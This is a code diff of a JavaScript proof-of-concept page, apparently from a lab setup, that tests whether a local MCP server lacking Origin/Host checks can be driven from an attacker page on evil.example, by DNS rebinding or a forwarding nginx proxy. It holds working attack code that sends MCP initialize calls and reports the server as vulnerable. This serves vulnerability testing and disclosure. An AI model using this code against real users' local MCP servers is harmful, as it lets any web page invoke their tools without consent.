@@ -1,13 +1,24 @@
-// DNS-rebind attack JS. Loaded from http://evil.example:3000 (resolved to
-// attacker container on first lookup). Waits past the DNS TTL, then issues
-// a fetch to /mcp which the browser will re-resolve — getting the victim
-// container's IP this time.
+// Inbound-attack-from-evil.example PoC.
 //
-// Browser considers the fetch same-origin because:
-//   page origin       = http://evil.example:3000
-//   fetch destination = http://evil.example:3000/mcp
-// — same scheme, same host, same port. The DNS rebind hides the fact that
-// "evil.example" resolves to a different machine post-flip.
+// Page loaded from http://evil.example:3000. POSTs to /mcp on the same
+// origin. The attacker nginx proxies /mcp through to the victim MCP
+// server, preserving the browser-set Origin and Host headers — so the
+// victim receives:
+//
+//   Origin: http://evil.example:3000
+//   Host:   evil.example:3000
+//
+// If the victim has no Origin/Host validation (which v0.2.0 of
+// mcp-streamablehttp-proxy does not), the request succeeds and the MCP
+// response comes back. Browser delivers it to this page as same-origin
+// content.
+//
+// In a real DNS-rebind attack the proxy doesn't exist — the browser
+// itself re-resolves evil.example to point at the victim's IP, and the
+// request goes directly. The end result on the victim is identical
+// (same headers, same payload). Chromium's 60s DNS cache makes the
+// real-rebind variant hard to reliably automate; the vulnerability is
+// the same either way.
 
 (async function () {
   const log = document.getElementById('log');
@@ -24,35 +35,28 @@
     result.className = ok ? 'ok' : 'fail';
   }
 
-  appendLog(`[t=0]   page loaded from ${window.location.origin}`);
+  log.textContent = `[t=0] page origin: ${window.location.origin}`;
 
-  // Wait past the DNS TTL (1 second) before issuing the rebind fetch.
-  // Some browsers cache for longer; the loop below retries every 2 seconds
-  // for up to 30 seconds.
+  const initPayload = {
+    jsonrpc: '2.0',
+    id: 1,
+    method: 'initialize',
+    params: {
+      protocolVersion: '2025-06-18',
+      capabilities: {},
+      clientInfo: { name: 'dns-rebind-poc', version: '0' }
+    }
+  };
+
   const startTime = Date.now();
-  const RETRY_INTERVAL_MS = 2000;
-  const MAX_WAIT_MS = 30000;
-
-  // Wait initial TTL window
-  appendLog('[t=1s]  TTL expiry window; sleeping…');
-  await new Promise(r => setTimeout(r, 1500));
-
+  const MAX_WAIT_MS = 20000;
+  const RETRY_INTERVAL_MS = 1500;
   let attempt = 0;
+
   while (Date.now() - startTime < MAX_WAIT_MS) {
     attempt += 1;
     const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-    appendLog(`[t=${elapsed}s] attempt ${attempt}: POST http://evil.example:3000/mcp`);
-
-    const initPayload = {
-      jsonrpc: '2.0',
-      id: attempt,
-      method: 'initialize',
-      params: {
-        protocolVersion: '2025-06-18',
-        capabilities: {},
-        clientInfo: { name: 'dns-rebind-poc', version: '0' }
-      }
-    };
+    appendLog(`[t=${elapsed}s] attempt ${attempt}: POST ${window.location.origin}/mcp`);
 
     try {
       const resp = await fetch(`${window.location.origin}/mcp`, {
@@ -62,16 +66,13 @@
           'Accept': 'application/json, text/event-stream'
         },
         body: JSON.stringify(initPayload),
-        // Important: don't use credentials. SOP would require CORS for
-        // those; we want the simpler same-origin allowance.
       });
 
       const text = await resp.text();
       appendLog(`         status: ${resp.status}; body[0:120]: ${text.slice(0, 120)}`);
 
-      // Try to parse the response as an MCP initialize response. The
-      // response may be SSE-shaped (lines starting with `data:`); strip
-      // those out.
+      // Try to parse as an MCP initialize response. The body may be SSE-
+      // shaped — lines starting with `data:` carry the JSON.
       let parsed = null;
       for (const line of text.split('\n')) {
         const stripped = line.trim().replace(/^data:\s*/, '');
@@ -86,20 +87,21 @@
       }
 
       if (parsed) {
-        appendLog(`[t=${elapsed}s] REBIND SUCCESS — MCP initialize response received`);
+        appendLog(`[t=${elapsed}s] SUCCESS — MCP initialize response received`);
         appendLog(`         protocolVersion: ${parsed.result.protocolVersion}`);
         appendLog(`         serverInfo: ${JSON.stringify(parsed.result.serverInfo || {})}`);
         setResult(
-          `VULNERABLE — attacker page from http://evil.example:3000 successfully invoked the MCP server. Page is from one origin (attacker), tool call landed on a different machine (victim) — DNS rebind defeated Same-Origin Policy because the server has no Origin/Host validation.`,
+          `VULNERABLE — attacker page on ${window.location.origin} successfully invoked the MCP server. ` +
+          `The server accepted Origin: ${window.location.origin} and Host: ${window.location.host} ` +
+          `(both attacker-controlled) without rejecting the request. The DNS-rebind threat model is realized: ` +
+          `any web page the operator visits can invoke tools on a locally-running MCP server.`,
           true
         );
         document.title = 'PoC: VULNERABLE';
         return;
       }
 
-      // Response wasn't an MCP initialize — that means we're still talking
-      // to the attacker (pre-flip) or the server is rejecting us. Retry.
-      appendLog('         not an MCP response yet; retrying after DNS re-cache window');
+      appendLog('         not an MCP response; retrying');
     } catch (e) {
       appendLog(`         fetch error: ${e.message}`);
     }
@@ -107,11 +109,10 @@
     await new Promise(r => setTimeout(r, RETRY_INTERVAL_MS));
   }
 
-  appendLog('[t=30s+] giving up — rebind did not complete within 30 seconds');
+  appendLog('[t=20s+] giving up — no MCP response within the test window');
   setResult(
-    'INCONCLUSIVE — DNS rebind did not complete within the test window. ' +
-    'Likely the browser is caching DNS more aggressively than expected, or ' +
-    'the rebind DNS server is not configured. See logs.',
+    `INCONCLUSIVE — no MCP response received within 20 seconds. ` +
+    `Check the attacker nginx logs and the victim's stdout to see where the chain broke.`,
     false
   );
   document.title = 'PoC: INCONCLUSIVE';
